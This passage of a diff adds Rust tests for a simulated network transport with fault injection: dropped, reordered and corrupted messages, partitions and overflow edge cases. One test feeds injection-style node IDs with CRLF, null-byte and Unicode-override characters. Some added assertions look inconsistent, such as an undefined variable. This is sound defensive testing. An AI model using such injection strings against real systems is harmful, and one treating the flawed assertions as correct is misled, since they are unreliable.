+                    vec![0xFF; 1024], // 1KB payload
+                ];
+
+                for payload in test_payloads {
+                    let msg_result = vt.send_message(&link_id, &payload);
+
+                    if payload.is_empty() && *bit_count > 0 {
+                        // Can't corrupt empty payload
+                        // Implementation-dependent behavior
+                    } else {
+                        assert!(msg_result.is_ok());
+                    }
+
+                    vt.advance_tick(1);
+                }
+            }
+        }
+
+        #[test]
+        fn test_network_partition_edge_cases() {
+            let mut vt = VirtualTransport::new(222);
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 0,
+                corrupt_bit_count: 0,
+                delay_ticks: 0,
+                partition: false,
+            };
+
+            vt.create_link("partition-link", "isolated1", "isolated2", config)
+                .expect("create link");
+
+            // Test partition/heal cycles
+            for cycle in 0..100 {
+                // Partition the link
+                let partition_result = vt.partition_link("partition-link");
+                assert!(partition_result.is_ok());
+
+                // Try to send during partition (should fail or be dropped)
+                let send_result = vt.send_message("partition-link", b"blocked-message");
+                // Implementation may allow queueing or reject immediately
+
+                // Heal the partition
+                let heal_result = vt.heal_partition("partition-link");
+                assert!(heal_result.is_ok());
+
+                // Send should work after healing
+                let heal_send_result =
+                    vt.send_message("partition-link", &format!("cycle-{}", cycle).into_bytes());
+                assert!(heal_send_result.is_ok());
+
+                vt.advance_tick(1);
+            }
+
+            // Verify partition events logged correctly
+            let events = vt.get_event_log();
+            let partition_events = events
+                .iter()
+                .filter(|e| e.event_code == event_codes::VT_005)
+                .count();
+            let heal_events = events
+                .iter()
+                .filter(|e| e.event_code == event_codes::VT_006)
+                .count();
+            assert_eq!(partition_events, heal_events); // Should be balanced
+        }
+
+        #[test]
+        fn test_concurrent_transport_access_safety() {
+            use std::sync::{Arc, Barrier, Mutex};
+            use std::thread;
+
+            let vt = Arc::new(Mutex::new(VirtualTransport::new(333)));
+            let barrier = Arc::new(Barrier::new(4));
+
+            // Pre-create link for all threads to use
+            {
+                let mut vt_lock = try_lock(&vt, "pre-create shared virtual transport link");
+                let config = LinkFaultConfig {
+                    drop_probability: 0.1,
+                    reorder_depth: 5,
+                    corrupt_bit_count: 1,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+                vt_lock
+                    .create_link("shared-link", "multi-sender", "multi-receiver", config)
+                    .expect("create shared link");
+            }
+
+            let handles: Vec<_> = (0..4)
+                .map(|i| {
+                    let vt = Arc::clone(&vt);
+                    let barrier = Arc::clone(&barrier);
+
+                    thread::spawn(move || {
+                        barrier.wait();
+
+                        // Each thread sends multiple messages
+                        for j in 0..10 {
+                            let payload = format!("thread-{}-msg-{}", i, j).into_bytes();
+
+                            let mut vt_lock =
+                                try_lock(&vt, "send concurrent virtual transport message");
+                            let result = vt_lock.send_message("shared-link", &payload);
+
+                            // Should handle concurrent access safely
+                            assert!(result.is_ok());
+
+                            vt_lock.advance_tick(1);
+                        }
+                    })
+                })
+                .collect();
+
+            // Wait for all threads to complete
+            for handle in handles {
+                handle.join().expect("thread should complete");
+            }
+
+            // Verify final state is consistent
+            let vt_lock = try_lock(&vt, "inspect final virtual transport state");
+            assert!(vt_lock.link_exists("shared-link"));
+            let events = vt_lock.get_event_log();
+            assert!(events.len() > 0);
+        }
+
+        #[test]
+        fn test_message_id_exhaustion_edge_case() {
+            let mut vt = VirtualTransport::new(444);
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 0,
+                corrupt_bit_count: 0,
+                delay_ticks: 0,
+                partition: false,
+            };
+
+            vt.create_link(
+                "exhaustion-link",
+                "stress-sender",
+                "stress-receiver",
+                config,
+            )
+            .expect("create link");
+
+            // Send messages until ID space is stressed
+            // Note: Real exhaustion would require 2^64 messages, so we test the boundary logic
+            for i in 0..10000 {
+                let payload = format!("stress-test-{}", i).into_bytes();
+                let result = vt.send_message("exhaustion-link", &payload);
+
+                // Should continue working for reasonable message counts
+                assert!(result.is_ok());
+
+                if i % 1000 == 0 {
+                    vt.advance_tick(1); // Periodic tick advance
+                }
+            }
+
+            // Transport should remain functional
+            assert!(vt.link_exists("exhaustion-link"));
+            let final_result = vt.send_message("exhaustion-link", b"final-test");
+            assert!(final_result.is_ok());
+        }
+
+        #[test]
+        fn test_floating_point_precision_corruption_rates() {
+            let mut vt = VirtualTransport::new(555);
+
+            // Test floating point precision edge cases for drop probability
+            let precision_probs = vec![
+                0.0000000001,       // Very small positive
+                0.9999999999,       // Very close to 1.0
+                0.5,                // Exact half
+                1.0 - f64::EPSILON, // Just below 1.0
+                f64::EPSILON,       // Smallest positive normal
+                0.3333333333333333, // Repeating decimal
+            ];
+
+            for (i, prob) in precision_probs.iter().enumerate() {
+                let config = LinkFaultConfig {
+                    drop_probability: *prob,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("precision-link-{}", i);
+                let result = vt.create_link(&link_id, "precise-sender", "precise-receiver", config);
+                assert!(result.is_ok());
+
+                // Send many messages to test probability precision
+                let mut successful_sends = 0;
+                for j in 0..1000 {
+                    let payload = format!("precision-{}", j).into_bytes();
+                    let send_result = vt.send_message(&link_id, &payload);
+
+                    if send_result.is_ok() {
+                        successful_sends += 1;
+                    }
+
+                    vt.advance_tick(1);
+                }
+
+                // Verify reasonable success rate based on drop probability
+                let success_rate = successful_sends as f64 / 1000.0;
+                let expected_success_rate = 1.0 - prob;
+
+                // Allow 10% tolerance for randomness
+                let tolerance = 0.1;
+                assert!(
+                    (success_rate - expected_success_rate).abs() <= tolerance,
+                    "Success rate {} too far from expected {} for probability {}",
+                    success_rate,
+                    expected_success_rate,
+                    prob
+                );
+            }
+        }
+
+        #[test]
+        fn negative_virtual_transport_comprehensive_unicode_node_id_injection() {
+            // Test comprehensive Unicode injection resistance in node IDs
+            let mut vt = VirtualTransport::new(777);
+
+            let malicious_node_patterns = [
+                "\u{202E}\u{202D}fake_node\u{202C}".to_string(), // Right-to-left override
+                "node\u{000A}\u{000D}injected\x00nulls".to_string(), // CRLF + null injection
+                "\u{FEFF}bom_node\u{FFFE}reversed".to_string(),  // BOM injection attacks
+                "\u{200B}\u{200C}\u{200D}zero_width".to_string(), // Zero-width characters
+                "节点\u{007F}\u{0001}\u{001F}控制".to_string(),  // Unicode + control chars
+                "\u{FFFF}\u{FFFE}\u{FDD0}non_chars".to_string(), // Non-character code points
+                "🚀💻\u{1F4A5}💥\u{1F52B}🔫".to_string(),        // Complex emoji sequences
+                "\u{0300}\u{0301}\u{0302}combining".to_string(), // Combining marks
+                "a".repeat(100_000),                             // Extremely long node ID
+                format!("{}\x00hidden_content", "visible"),      // Null byte injection
+            ];
+
+            for (i, pattern) in malicious_node_patterns.iter().enumerate() {
+                let link_id = format!("unicode_test_link_{}", i);
+                let source_node = format!("src_{}{}", pattern, i);
+                let target_node = format!("tgt_{}{}", pattern, i);
+
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                // Should handle Unicode node IDs gracefully
+                let result = vt.create_link(&link_id, &source_node, &target_node, config);
+
+                match result {
+                    Ok(_) => {
+                        // If link creation succeeds, test message sending
+                        let test_payload =
+                            format!("unicode_test_payload_{}", i).as_bytes().to_vec();
+                        let send_result = vt.send_message(&link_id, &test_payload);
 
                         match send_result {
-                            Ok(_) => {
+                            Ok(msg_id) => {
+                                // Verify message structure is not corrupted by Unicode
+                                assert!(msg_id > 0);
+
+                                // Check if message can be delivered
                                 vt.advance_tick(1);
-                                let delivered = vt.collect_delivered_messages("corrupt_tgt");
+                                let delivered = vt.collect_delivered_messages(&target_node);
 
-                                if !delivered.is_empty() {
-                                    let msg = &delivered[0];
-
-                                    // Verify payload length is preserved
-                                    assert_eq!(
-                                        msg.payload.len(),
-                                        original_payload.len(),
-                                        "Payload length should be preserved: {} size {}",
-                                        test_name,
-                                        payload_size
-                                    );
-
-                                    if corrupt_bit_count == 0 {
-                                        // No corruption - should be identical
-                                        assert_eq!(
-                                            msg.payload, original_payload,
-                                            "No corruption should preserve payload: {}",
-                                            test_name
-                                        );
-                                    } else if corrupt_bit_count < payload_size * 8 {
-                                        // Some corruption - should be different but reasonable
-                                        let mut differing_bits = 0;
-                                        for i in 0..original_payload.len() {
-                                            let diff = original_payload[i] ^ msg.payload[i];
-                                            differing_bits += diff.count_ones() as usize;
-                                        }
-
-                                        // Should have approximately the requested number of bit flips
-                                        if payload_size * 8 >= corrupt_bit_count {
-                                            assert!(
-                                                differing_bits > 0,
-                                                "Should have some bit differences: {} size {}",
-                                                test_name,
-                                                payload_size
-                                            );
-                                            assert!(
-                                                differing_bits <= corrupt_bit_count * 2,
-                                                "Bit differences should be reasonable: {} size {}",
-                                                test_name,
-                                                payload_size
-                                            );
-                                        }
-                                    }
+                                // Delivery may succeed or fail, but should not crash
+                                for msg in delivered {
+                                    assert_eq!(msg.payload, test_payload);
+                                    assert!(msg.source.contains(&format!("{}", i)));
+                                    assert!(msg.target.contains(&format!("{}", i)));
                                 }
                             }
-                            Err(err) => {
-                                // Large corruption configurations may be rejected
-                                if corrupt_bit_count > 10000 {
+                            Err(_) => {
+                                // Acceptable to reject extreme Unicode patterns
+                            }
+                        }
+                    }
+                    Err(_) => {
+                        // Acceptable to reject malicious node ID patterns
+                    }
+                }
+
+                // Event log should handle Unicode gracefully without corruption
+                let events = vt.event_log();
+                for event in events {
+                    // All event fields should remain valid UTF-8
+                    assert!(!event.event_code.contains('\0'));
+                    if !event.link_id.is_empty() {
+                        assert!(!event.link_id.contains('\0'));
+                    }
+                    // Message content corruption is expected for corruption tests, but structure should be intact
+                }
+            }
+        }
+
+        #[test]
+        fn negative_message_payload_extreme_size_and_corruption_boundaries() {
+            // Test extreme message payload sizes and corruption boundary conditions
+            let mut vt = VirtualTransport::new(888);
+
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 0,
+                corrupt_bit_count: 8, // 1 byte corruption
+                delay_ticks: 0,
+                partition: false,
+            };
+
+            vt.create_link("extreme-test", "extreme-src", "extreme-tgt", config)
+                .expect("create extreme test link");
+
+            // Test various extreme payload sizes
+            let extreme_payloads = vec![
+                Vec::new(),                                               // Empty payload
+                vec![0u8; 1],                                             // Single byte
+                vec![0xFF; 1024],                                         // All ones, 1KB
+                vec![0x00; 1024],                                         // All zeros, 1KB
+                (0..256).map(|i| i as u8).cycle().take(10_000).collect(), // Pattern, 10KB
+                vec![0x42; 1_000_000],                                    // Large payload, 1MB
+                (0..100_000).map(|i| (i % 256) as u8).collect(),          // Sequence pattern
+            ];
+
+            for (i, payload) in extreme_payloads.into_iter().enumerate() {
+                let original_len = payload.len();
+                let original_checksum: u32 = payload.iter().map(|&b| b as u32).sum();
+
+                let result = vt.send_message("extreme-test", &payload);
+
+                match result {
+                    Ok(msg_id) => {
+                        assert!(msg_id > 0);
+
+                        // Advance time to allow delivery
+                        vt.advance_tick(1);
+
+                        // Collect delivered messages
+                        let delivered = vt.collect_delivered_messages("extreme-tgt");
+
+                        // May have been corrupted due to fault injection
+                        for msg in delivered {
+                            assert_eq!(msg.id, msg_id);
+                            assert_eq!(msg.source, "extreme-src");
+                            assert_eq!(msg.target, "extreme-tgt");
+                            assert_eq!(msg.payload.len(), original_len);
+
+                            // With 8-bit corruption, payload should differ by exactly 8 bits
+                            if corrupt_bit_count > 0 {
+                                let received_checksum: u32 =
+                                    msg.payload.iter().map(|&b| b as u32).sum();
+                                // Checksum will likely differ, but length should be preserved
+                                // For large payloads, corruption should be minimal relative change
+                                if original_len > 1000 {
+                                    let bit_diff_estimate =
+                                        original_checksum.abs_diff(received_checksum);
+                                    // Should be reasonable corruption (8 bits flipped max)
                                     assert!(
-                                        err.to_string().contains("corrupt")
-                                            || err.to_string().contains("bit")
-                                            || err.to_string().contains("size"),
-                                        "Corruption error should be meaningful: {} - {}",
-                                        test_name,
-                                        err
-                                    );
-                                } else {
-                                    assert!(
-                                        corrupt_bit_count > 10000,
-                                        "Unexpected error for reasonable corruption {corrupt_bit_count}: {err}"
+                                        bit_diff_estimate <= 8 * 256,
+                                        "Corruption too extensive for payload {}",
+                                        i
                                     );
                                 }
                             }
                         }
                     }
-
-                    vt.destroy_link(&link_id).ok();
-                }
-                Err(err) => {
-                    // Very large bit counts may be rejected at link creation
-                    if corrupt_bit_count > 100000 {
+                    Err(_) => {
+                        // Large payloads may be rejected - acceptable
                         assert!(
-                            err.to_string().contains("corrupt") || err.to_string().contains("bit"),
-                            "Large corruption error should be meaningful: {}",
-                            err
-                        );
-                    } else {
-                        assert!(
-                            corrupt_bit_count > 100000,
-                            "Unexpected link creation error for corruption {corrupt_bit_count}: {err}"
+                            original_len > 100_000,
+                            "Small payloads should not be rejected"
                         );
                     }
                 }
             }
+
+            // Test boundary conditions for bit corruption
+            let boundary_configs = [
+                LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0, // No corruption
+                    delay_ticks: 0,
+                    partition: false,
+                },
+                LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 1, // Single bit
+                    delay_ticks: 0,
+                    partition: false,
+                },
+                LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 64, // Many bits
+                    delay_ticks: 0,
+                    partition: false,
+                },
+                LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 10_000, // Extreme corruption
+                    delay_ticks: 0,
+                    partition: false,
+                },
+            ];
+
+            for (i, config) in boundary_configs.into_iter().enumerate() {
+                let link_id = format!("corruption_boundary_{}", i);
+                let result = vt.create_link(&link_id, "corrupt-src", "corrupt-tgt", config);
+
+                if result.is_ok() {
+                    let test_payload = format!("boundary_test_{}", i)
+                        .repeat(100)
+                        .as_bytes()
+                        .to_vec();
+                    let send_result = vt.send_message(&link_id, &test_payload);
+
+                    // Should handle extreme corruption settings gracefully
+                    match send_result {
+                        Ok(_) => {
+                            vt.advance_tick(1);
+                            let _delivered = vt.collect_delivered_messages("corrupt-tgt");
+                            // Any result is acceptable as long as no panic
+                        }
+                        Err(_) => {
+                            // May reject extreme corruption settings
+                        }
+                    }
+                }
+            }
         }
-    }
 
-    #[test]
-    fn negative_concurrent_link_operations_state_consistency() {
-        // Test concurrent-like link operations that might expose race conditions
-        let mut vt = VirtualTransport::new(3333);
+        #[test]
+        fn negative_reorder_buffer_overflow_and_memory_exhaustion() {
+            // Test reorder buffer overflow and memory exhaustion scenarios
+            let mut vt = VirtualTransport::new(999);
 
-        // Rapid creation/destruction cycles
-        for cycle in 0..100 {
-            let link_count = (cycle % 10) + 1; // 1-10 links per cycle
-            let mut created_links = Vec::new();
+            // Test extreme reorder depths
+            let extreme_reorder_configs = [
+                0,          // No reordering
+                1,          // Minimal reordering
+                1000,       // Large buffer
+                100_000,    // Massive buffer
+                usize::MAX, // Maximum possible
+            ];
 
-            // Create multiple links rapidly
-            for i in 0..link_count {
-                let link_id = format!("concurrent_{}_{}", cycle, i);
+            for (i, reorder_depth) in extreme_reorder_configs.into_iter().enumerate() {
                 let config = LinkFaultConfig {
-                    drop_probability: (i as f64) / 10.0,
-                    reorder_depth: i * 10,
-                    corrupt_bit_count: i,
-                    delay_ticks: (i as u64) * 5,
+                    drop_probability: 0.0,
+                    reorder_depth,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
                     partition: false,
                 };
 
-                let create_result = vt.create_link(
+                let link_id = format!("reorder_test_{}", i);
+                let result = vt.create_link(&link_id, "reorder-src", "reorder-tgt", config);
+
+                match result {
+                    Ok(_) => {
+                        // Send many messages to stress the reorder buffer
+                        for j in 0..min(reorder_depth + 100, 10_000) {
+                            let payload = format!("reorder_msg_{}_{}", i, j).as_bytes().to_vec();
+                            let send_result = vt.send_message(&link_id, &payload);
+
+                            match send_result {
+                                Ok(_) => {
+                                    // Periodically advance time
+                                    if j % 100 == 0 {
+                                        vt.advance_tick(1);
+                                    }
+                                }
+                                Err(_) => {
+                                    // May hit memory or other limits
+                                    break;
+                                }
+                            }
+                        }
+
+                        // Force delivery of remaining messages
+                        for _tick in 0..100 {
+                            vt.advance_tick(1);
+                            let delivered = vt.collect_delivered_messages("reorder-tgt");
+
+                            // Verify delivered messages maintain integrity
+                            for msg in delivered {
+                                assert!(msg.source == "reorder-src");
+                                assert!(msg.target == "reorder-tgt");
+                                assert!(!msg.payload.is_empty());
+                                assert!(msg.tick_delivered.is_some());
+                            }
+                        }
+                    }
+                    Err(_) => {
+                        // Extreme reorder depths may be rejected
+                        assert!(
+                            reorder_depth > 50_000,
+                            "Reasonable reorder depths should be accepted"
+                        );
+                    }
+                }
+            }
+
+            // Test memory pressure with concurrent reordering on multiple links
+            for i in 0..100 {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.0,
+                    reorder_depth: 1000, // Moderate reordering on many links
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("concurrent_reorder_{}", i);
+                if vt
+                    .create_link(
+                        &link_id,
+                        &format!("src_{}", i),
+                        &format!("tgt_{}", i),
+                        config,
+                    )
+                    .is_ok()
+                {
+                    // Send a few messages on each link
+                    for j in 0..10 {
+                        let payload = format!("concurrent_{}_{}", i, j).as_bytes().to_vec();
+                        let _result = vt.send_message(&link_id, &payload);
+                    }
+                }
+            }
+
+            // Advance time to trigger reorder buffer processing across all links
+            for _tick in 0..50 {
+                vt.advance_tick(1);
+            }
+
+            // System should remain stable despite memory pressure
+            let events = vt.event_log();
+            assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
+
+            // All events should be well-formed
+            for event in events {
+                assert!(!event.event_code.is_empty());
+                assert!(event.tick >= 0);
+            }
+        }
+
+        #[test]
+        fn negative_tick_overflow_and_time_manipulation_edge_cases() {
+            // Test tick counter overflow and extreme time manipulation scenarios
+            let mut vt = VirtualTransport::new(1111);
+
+            let config = LinkFaultConfig {
+                drop_probability: 0.0,
+                reorder_depth: 5,
+                corrupt_bit_count: 0,
+                delay_ticks: u64::MAX / 2, // Extreme delay
+                partition: false,
+            };
+
+            vt.create_link("time-test", "time-src", "time-tgt", config)
+                .expect("create time test link");
+
+            // Test near u64::MAX tick values
+            let extreme_ticks = [
+                0,               // Start time
+                1,               // Minimal advance
+                1000,            // Normal operation
+                u64::MAX / 2,    // Mid-range
+                u64::MAX - 1000, // Near overflow
+                u64::MAX - 1,    // Just before overflow
+                u64::MAX,        // Maximum value
+            ];
+
+            for target_tick in extreme_ticks {
+                let current_tick = vt.current_tick();
+
+                // Attempt to jump to target tick (may overflow)
+                if target_tick > current_tick {
+                    let advance_amount = target_tick.saturating_sub(current_tick);
+
+                    // Advance in chunks to avoid potential infinite loops
+                    let chunk_size = min(advance_amount, 1_000_000);
+                    let chunks = advance_amount / chunk_size;
+
+                    for _chunk in 0..min(chunks, 1000) {
+                        // Limit chunks to prevent test timeout
+                        vt.advance_tick(chunk_size);
+
+                        // Send test message at extreme tick values
+                        let payload = format!("tick_test_at_{}", vt.current_tick())
+                            .as_bytes()
+                            .to_vec();
+                        let result = vt.send_message("time-test", &payload);
+
+                        match result {
+                            Ok(msg_id) => {
+                                // Message should have reasonable timestamp
+                                assert!(msg_id > 0);
+                            }
+                            Err(_) => {
+                                // May fail at extreme tick values
+                            }
+                        }
+
+                        // Check for overflow issues
+                        let new_tick = vt.current_tick();
+                        assert!(new_tick >= current_tick, "Tick should not go backwards");
+
+                        // Stop if we've reached reasonable advancement
+                        if new_tick >= target_tick || _chunk >= 100 {
+                            break;
+                        }
+                    }
+                }
+            }
+
+            // Test delivery at extreme future times
+            let future_messages = vt.collect_delivered_messages("time-tgt");
+            for msg in future_messages {
+                // Messages should have consistent timing
+                if let Some(delivered_tick) = msg.tick_delivered {
+                    assert!(
+                        delivered_tick >= msg.tick_created,
+                        "Delivery time should not precede creation time"
+                    );
+
+                    // Check for overflow in tick arithmetic
+                    assert!(
+                        delivered_tick < u64::MAX,
+                        "Delivered tick should not overflow"
+                    );
+                }
+            }
+
+            // Event log should handle extreme tick values
+            let events = vt.event_log();
+            for event in events {
+                assert!(event.tick <= vt.current_tick());
+                assert!(!event.event_code.is_empty());
+            }
+        }
+
+        #[test]
+        fn negative_probability_edge_cases_and_floating_point_attacks() {
+            // Test edge cases in probability calculations and floating-point vulnerabilities
+            let mut vt = VirtualTransport::new(2222);
+
+            // Extreme and malicious probability values
+            let malicious_probabilities = [
+                f64::NAN,                           // Not a number
+                f64::INFINITY,                      // Positive infinity
+                f64::NEG_INFINITY,                  // Negative infinity
+                -0.0,                               // Negative zero
+                -1.0,                               // Invalid negative
+                2.0,                                // Invalid > 1.0
+                f64::MIN,                           // Smallest finite value
+                f64::MAX,                           // Largest finite value
+                f64::EPSILON,                       // Machine epsilon
+                1.0 + f64::EPSILON,                 // Just above 1.0
+                -f64::EPSILON,                      // Just below 0.0
+                0.5000000000000001,                 // Precision edge case
+                1.0 / 3.0,                          // Repeating decimal
+                f64::from_bits(0x7FF8000000000001), // Specific NaN pattern
+                f64::from_bits(0xFFF8000000000001), // Different NaN pattern
+            ];
+
+            for (i, prob) in malicious_probabilities.into_iter().enumerate() {
+                let config = LinkFaultConfig {
+                    drop_probability: prob,
+                    reorder_depth: 0,
+                    corrupt_bit_count: 0,
+                    delay_ticks: 0,
+                    partition: false,
+                };
+
+                let link_id = format!("prob_test_{}", i);
+                let result = vt.create_link(&link_id, "prob-src", "prob-tgt", config);
+
+                // Should validate and reject invalid probabilities
+                match result {
+                    Ok(_) => {
+                        // If accepted, probability should be in valid range
+                        assert!(
+                            prob.is_finite() && prob >= 0.0 && prob <= 1.0,
+                            "Invalid probability {} was accepted",
+                            prob
+                        );
+
+                        // Test message sending with potentially dangerous probability
+                        for j in 0..100 {
+                            let payload = format!("prob_test_{}_{}", i, j).as_bytes().to_vec();
+                            let send_result = vt.send_message(&link_id, &payload);
+
+                            match send_result {
+                                Ok(_) => {
+                                    vt.advance_tick(1);
+                                }
+                                Err(_) => {
+                                    // Some sends may fail due to drop probability
+                                }
+                            }
+                        }
+
+                        // Verify system stability after probability calculations
+                        let delivered = vt.collect_delivered_messages("prob-tgt");
+                        let delivery_count = delivered.len();
+
+                        // With valid probabilities, should get reasonable delivery rates
+                        if prob == 0.0 {
+                            assert_eq!(
+                                delivery_count, 100,
+                                "Zero drop probability should deliver all messages"
+                            );
+                        } else if prob == 1.0 {
+                            assert_eq!(
+                                delivery_count, 0,
+                                "100% drop probability should deliver no messages"
+                            );
+                        }
+                        // Other valid probabilities should give intermediate results
+                    }
+                    Err(err) => {
+                        // Invalid probabilities should be rejected with proper error
+                        match err {
+                            VirtualTransportError::InvalidProbability { field, value } => {
+                                assert_eq!(field, "drop_probability");
+                                assert!(
+                                    (value.is_nan() || value < 0.0 || value > 1.0),
+                                    "Error should be for invalid probability, got value: {}",
+                                    value
+                                );
+                            }
+                            _ => {
+                                // Other error types may be valid for extreme values
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Test floating-point precision attacks in batch operations
+            let precision_attacks = [
+                vec![0.1; 10],                                 // Repeated 0.1 (known precision issues)
+                vec![0.3333333333333333; 10],                  // Repeated 1/3
+                (0..100).map(|i| (i as f64) * 0.01).collect(), // 0.00, 0.01, 0.02, ...
+            ];
+
+            for (attack_idx, probs) in precision_attacks.into_iter().enumerate() {
+                let mut accumulated_error = 0.0;
+
+                for (i, prob) in probs.into_iter().enumerate() {
+                    let config = LinkFaultConfig {
+                        drop_probability: prob,
+                        reorder_depth: 0,
+                        corrupt_bit_count: 0,
+                        delay_ticks: 0,
+                        partition: false,
+                    };
+
+                    let link_id = format!("precision_attack_{}_{}", attack_idx, i);
+                    if vt
+                        .create_link(&link_id, "precision-src", "precision-tgt", config)
+                        .is_ok()
+                    {
+                        // Test that accumulated floating-point errors don't cause issues
+                        accumulated_error += prob;
+
+                        // Should handle precision issues gracefully
+                        let test_payload = format!("precision_{}", i).as_bytes().to_vec();
+                        let _result = vt.send_message(&link_id, &test_payload);
+                    }
+                }
+
+                // System should remain stable despite floating-point precision issues
+                vt.advance_tick(10);
+                let events = vt.event_log();
+                assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
+            }
+        }
+
+        #[test]
+        fn negative_link_lifecycle_race_conditions_and_state_corruption() {
+            // Test race conditions and state corruption in link lifecycle management
+            let mut vt = VirtualTransport::new(3333);
+
+            // Rapid link creation/destruction cycles
+            for cycle in 0..100 {
+                let link_id = format!("race_link_{}", cycle);
+                let config = LinkFaultConfig::default();
+
+                // Create link
+                let create_result = vt.create_link(&link_id, "race-src", "race-tgt", config);
+                assert!(create_result.is_ok());
+
+                // Immediately send messages
+                for i in 0..10 {
+                    let payload = format!("race_msg_{}_{}", cycle, i).as_bytes().to_vec();
+                    let _send_result = vt.send_message(&link_id, &payload);
+                }
+
+                // Destroy link while messages may be in flight
+                let destroy_result = vt.destroy_link(&link_id);
+                assert!(destroy_result.is_ok());
+
+                // Attempt operations on destroyed link
+                let payload = b"after_destroy".to_vec();
+                let after_destroy = vt.send_message(&link_id, &payload);
+                assert!(after_destroy.is_err(), "Should not send on destroyed link");
+
+                // Attempt to recreate with same ID
+                let recreate_result = vt.create_link(
+                    &link_id,
+                    "race-src2",
+                    "race-tgt2",
+                    LinkFaultConfig::default(),
+                );
+                assert!(
+                    recreate_result.is_ok(),
+                    "Should be able to recreate destroyed link"
+                );
+
+                // Advance time occasionally
+                if cycle % 10 == 0 {
+                    vt.advance_tick(1);
+                }
+            }
+
+            // Test concurrent modifications of multiple links
+            let base_links = [
+                "concurrent_a",
+                "concurrent_b",
+                "concurrent_c",
+                "concurrent_d",
+            ];
+
+            // Create base links
+            for link_id in &base_links {
+                let config = LinkFaultConfig {
+                    drop_probability: 0.1,
+                    reorder_depth: 10,
+                    corrupt_bit_count: 1,
+                    delay_ticks: 5,
+                    partition: false,
+                };
+                vt.create_link(link_id, "concurrent-src", "concurrent-tgt", config)
+                    .expect("create concurrent link");
+            }
+
+            // Simulate concurrent operations
+            for round in 0..50 {
+                // Send messages on all links
+                for link_id in &base_links {
+                    let payload = format!("concurrent_round_{}", round).as_bytes().to_vec();
+                    let _result = vt.send_message(link_id, &payload);
+                }
+
+                // Modify link configurations
+                for (i, link_id) in base_links.iter().enumerate() {
+                    if round % (i + 2) == 0 {
+                        // Toggle partition state
+                        let new_config = LinkFaultConfig {
+                            drop_probability: 0.2,
+                            reorder_depth: 5,
+                            corrupt_bit_count: 2,
+                            delay_ticks: 10,
+                            partition: (round + i) % 3 == 0,
+                        };
+                        let _update_result = vt.update_link_config(link_id, new_config);
+                    }
+                }
+
+                // Advance time
+                vt.advance_tick(1);
+
+                // Collect messages from random targets
+                let target = if round % 2 == 0 {
+                    "concurrent-tgt"
+                } else {
+                    "nonexistent-tgt"
+                };
+                let _delivered = vt.collect_delivered_messages(target);
+            }
+
+            // Verify system integrity after stress test
+            assert!(vt.link_exists("concurrent_a"));
+            assert!(vt.link_exists("concurrent_b"));
+            assert!(vt.link_exists("concurrent_c"));
+            assert!(vt.link_exists("concurrent_d"));
+
+            // Event log should be coherent
+            let events = vt.event_log();
+            assert!(events.len() <= DEFAULT_MAX_EVENT_LOG_ENTRIES);
+
+            for event in events {
+                assert!(!event.event_code.is_empty());
+                assert!(event.tick <= vt.current_tick());
+            }
+
+            // Final cleanup should work
+            for link_id in &base_links {
+                let destroy_result = vt.destroy_link(link_id);
+                assert!(destroy_result.is_ok());
+                assert!(!vt.link_exists(link_id));
+            }
+        }
+
+        #[test]
+        fn negative_message_id_exhaustion_and_wraparound_behavior() {
+            // Test message ID exhaustion and wraparound behavior
+            let mut vt = VirtualTransport::new(4444);
+
+            let config = LinkFaultConfig::default();
+            vt.create_link("id-test", "id-src", "id-tgt", config)
+                .expect("create ID test link");
+
+            // Manually advance internal message ID counter near overflow (if accessible)
+            // This is a conceptual test since we can't directly manipulate internal state
+
+            // Send many messages to approach ID exhaustion
+            let mut sent_ids = std::collections::HashSet::new();
+            let mut last_successful_id = 0u64;
+
+            for i in 0..100_000 {
+                let payload = format!("id_test_{}", i).as_bytes().to_vec();
+                let result = vt.send_message("id-test", &payload);
+
+                match result {
+                    Ok(msg_id) => {
+                        // Verify ID uniqueness
+                        assert!(!sent_ids.contains(&msg_id), "Message ID {} reused", msg_id);
+                        sent_ids.insert(msg_id);
+
+                        // IDs should generally increase (unless wrapping)
+                        if i > 0 {
+                            if msg_id < last_successful_id {
+                                // Potential wraparound detected
+                                assert!(
+                                    last_successful_id > u64::MAX / 2,
+                                    "Unexpected ID decrease without wraparound"
+                                );
+                            }
+                        }
+                        last_successful_id = msg_id;
+                    }
+                    Err(err) => {
+                        // May hit ID exhaustion
+                        match err {
+                            VirtualTransportError::MessageIdExhausted => {
+                                // Expected behavior at ID exhaustion
+                                break;
+                            }
+                            _ => {
+                                // Other errors might occur under stress
+                            }
+                        }
+                    }
+                }
+
+                // Periodically advance time and clear delivered messages
+                if i % 1000 == 0 {
+                    vt.advance_tick(1);
+                    let _delivered = vt.collect_delivered_messages("id-tgt");
+                }
+            }
+
+            // Test behavior with ID space pressure
+            // Send messages in bursts to stress ID allocation
+            for burst in 0..10 {
+                let mut burst_ids = Vec::new();
+
+                for i in 0..1000 {
+                    let payload = format!("burst_{}_msg_{}", burst, i).as_bytes().to_vec();
+                    if let Ok(msg_id) = vt.send_message("id-test", &payload) {
+                        burst_ids.push(msg_id);
+                    }
+                }
+
+                // All IDs in a burst should be unique
+                let mut sorted_ids = burst_ids.clone();
+                sorted_ids.sort();
+                sorted_ids.dedup();
+                assert_eq!(
